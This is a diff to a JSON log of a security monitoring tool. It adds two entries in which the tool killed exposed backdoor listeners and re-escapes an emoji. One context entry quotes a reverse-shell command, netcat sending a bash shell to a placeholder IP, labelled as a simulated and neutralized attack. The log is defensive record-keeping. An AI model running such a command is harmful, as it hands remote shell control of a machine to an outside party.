@@ -7,7 +7,7 @@
     "threat_type": "REVERSE_SHELL_ATTACK",
     "cmdline": "nc -e /bin/bash 198.51.100.44 4444 (Simulated Attack Neutralized)",
     "action_taken": "IMMEDIATE_TERMINATION",
-    "severity": "CRITICAL 🚨",
+    "severity": "CRITICAL \ud83d\udea8",
     "simulated": true
   },
   {
@@ -17,5 +17,19 @@
     "threat_type": "UNAUTHORIZED_CLOUD_ACCESS_ATTEMPT",
     "action_taken": "BLOCKED_AND_ALERTED",
     "enforced_by": "Aradhya Cloud Security Guard"
+  },
+  {
+    "timestamp": "2026-11-03 00:14:14",
+    "pid": 177223,
+    "port": 8888,
+    "threat_type": "BACKDOOR_LISTENER_EXPOSED",
+    "action_taken": "PORT_LISTENER_KILLED"
+  },
+  {
+    "timestamp": "2026-11-03 00:14:49",
+    "pid": 177604,
+    "port": 8888,
+    "threat_type": "BACKDOOR_LISTENER_EXPOSED",
+    "action_taken": "PORT_LISTENER_KILLED"
   }
 ]
